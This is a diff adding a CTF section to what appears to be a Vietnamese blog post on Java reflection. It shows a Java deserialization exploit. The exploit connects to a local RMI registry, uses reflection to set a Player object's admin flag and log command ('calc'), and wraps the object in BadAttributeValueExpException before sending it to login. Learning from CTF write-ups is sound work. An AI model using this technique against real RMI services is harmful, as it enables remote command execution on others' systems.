@@ -242,6 +242,49 @@ public class Main {
 }
 
 ```
+Ap dung giai CTF: Java deserialization
+
+```
+// Payload.java
+package rmi;
+
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Field;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class Payload {
+    public static void main(String[] args) throws RemoteException, BadAttributeValueExpException, NotBoundException, NoSuchFieldException, IllegalAccessException {
+        String serverIP = "127.0.0.1";
+        int serverPort = 1099;
+        String name = "hacker";
+
+        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
+
+        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
+        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");
+
+        rmi.Player player = new rmi.Player(); // khoi tao doi tuong player;
+
+        Field isAdmin = player.getClass().getDeclaredField("isAdmin");
+        isAdmin.setAccessible(true);
+        isAdmin.set(player,true);
+
+        Field command = player.getClass().getDeclaredField("logCommand");
+        command.setAccessible(true);
+        command.set(player,"calc");
+
+        Field val = payload.getClass().getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(payload,player);
+
+        System.out.println(ascisInterf.login(payload));
+    }
+}
+```
+
 ![GIRL](/images/java reflection/pic2.jfif)
 
 # Tham khảo:
